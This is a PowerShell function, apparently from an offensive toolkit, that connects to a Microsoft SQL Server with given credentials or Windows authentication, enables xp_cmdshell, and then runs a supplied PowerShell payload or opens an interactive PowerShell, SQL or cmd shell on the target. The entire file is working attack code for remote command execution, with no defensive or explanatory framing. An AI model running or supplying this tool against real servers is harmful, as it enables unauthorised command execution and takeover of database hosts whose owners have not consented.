  function Execute-Command-MSSQL {
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
        [string]
        $ComputerName,
        [parameter(Mandatory = $False, Position = 1)]
        [string]
        $UserName,
        [parameter(Mandatory = $False, Position = 2)]
        [string]
        $Password,
        [parameter(Mandatory = $False, Position = 3)]
        [string]
        $payload,
        [parameter()]
        [switch]
        $WindowsAuthentication
    )
    Try{
    function Make-Connection ($query)
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        if ($WindowsAuthentication -eq $True)
        {
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
        }
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        $Command.CommandText = $query
        $Reader = $Command.ExecuteReader()
        $Connection.Close()
    }
    "Connecting to $ComputerName..." 
    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    "`nEnabling XP_CMDSHELL...`n"
    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
    if ($payload)
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        if ($WindowsAuthentication -eq $True)
        {
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
        }
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        $cmd = "EXEC xp_cmdshell 'powershell.exe $payload'"
        $Command.CommandText = "$cmd"
        $Reader = $Command.ExecuteReader()
        while ($reader.Read()) {
            New-Object PSObject -Property @{
            Name = $reader.GetValue(0)
            }
        }
        $Connection.Close()
    }
    else
    {
        write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
        $shell = read-host
        while($payload -ne "exit")
        {
            $Connection = New-Object System.Data.SQLClient.SQLConnection
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
            if ($WindowsAuthentication -eq $True)
            {
                $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
            }
            $Connection.Open()
            $Command = New-Object System.Data.SQLClient.SQLCommand
            $Command.Connection = $Connection
            if ($shell -eq "P")
            {
                write-host "`n`nStarting PowerShell on the target..`n"
                write-host -NoNewline "PS $ComputerName> "
                $payload = read-host
                $cmd = "EXEC xp_cmdshell 'powershell.exe -Command $payload'"
            }
            elseif ($shell -eq "S")
            {
                write-host "`n`nStarting SQL shell on the target..`n"
                write-host -NoNewline "MSSQL $ComputerName> "
                $payload = read-host
                $cmd = $payload
            }
            elseif ($shell -eq "C")
            {
                write-host "`n`nStarting cmd shell on the target..`n"
                write-host -NoNewline "CMD $ComputerName> "
                $payload = read-host
                $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
            }
            $Command.CommandText = "$cmd"
            $Reader = $Command.ExecuteReader()
            while ($reader.Read()) {
                New-Object PSObject -Property @{
                Name = $reader.GetValue(0)
                }
            }
            $Connection.Close()
        }
    }    
    }Catch {
        $error[0]
    }
}
